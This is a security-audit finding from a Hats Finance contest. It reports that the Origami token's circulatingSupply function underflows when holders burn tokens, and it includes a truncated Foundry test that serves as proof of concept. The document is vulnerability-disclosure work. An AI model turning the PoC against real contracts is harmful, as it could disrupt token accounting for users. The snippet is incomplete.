# [H] OrigamiOToken::circulatingSupply will underflow when users burn their tokens.

## Summary
Severity: High
Chain: Smart contract
Component: Origami
Published: 2024-02-22
Source: https://github.com/hats-finance/Origami-0x998f1b716a5022be026ca6b919c0ddf45ca31abd/issues/7
Type: hats-finding

## Details
**Github username:** @erictee2802
**Twitter username:** 0xEricTee
**Submission hash (on-chain):** 0x995c916914d1e7efc77578b362f16ea38069bbc9f22c3e35e9b0f5f74712901d
**Severity:** high

**Description:**
**Description**\

OrigamiOToken::circulatingSupply will underflow when users burn their tokens.


**Attack Scenario**\

Check the Poc below.


**Attachments**

NA

1. **Proof of Concept (PoC) File**
<!-- You must provide a file containing a proof of concept (PoC) that demonstrates the vulnerability you have discovered. -->

Add the following content to `OrigamiOToken.t.sol`:
```solidity

function test_circulatingSupplyUnderflow() public {
        address exploiter = makeAddr("EXPLOITER");
        vm.prank(origamiMultisig);
        oToken.amoMint(exploiter, 100);
        console.log(oToken.circulatingSupply());
        vm.prank(exploiter);
        oToken.burn(100);
        console.log(oToken.circulatingSupply());




```

_Trimmed to 38 lines — full report: https://github.com/hats-finance/Origami-0x998f1b716a5022be026ca6b919c0ddf45ca31abd/issues/7_
